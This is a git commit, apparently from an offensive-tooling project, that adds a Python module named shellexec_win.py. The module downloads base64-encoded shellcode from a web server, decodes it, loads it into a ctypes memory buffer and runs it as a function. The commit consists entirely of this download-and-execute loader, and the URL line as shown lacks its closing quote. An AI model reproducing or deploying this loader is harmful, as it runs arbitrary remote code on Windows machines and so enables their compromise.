19a3db256c95b041e47db29b645026fe3dd07e35
carnal0wnage <chris@carnal0wnage.com>
2016-05-24 13:47:15 -0400

    shellcode exec win attempt1

---
+++ modules/shellexec_win.py
@@ -0,0 +1,24 @@
+import urllib2
+import ctypes
+import base64
+
+def run(**args):
+    url = "http://localhost:8000/shellcode.bin
+    print "[*] In shellcode exec (Windows) module."
+    # retrieve the shellcode from our web server
+    response = urllib2.urlopen(url)
+
+    # decode the shellcode from base64
+    shellcode = base64.b64decode(response.read())
+
+    # create a buffer in memory
+    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+
+    # create a function pointer to our shellcode
+    shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
+
+    # call our shellcode
+    shellcode_func()
+    
+    return str("Magic Happened?")
+
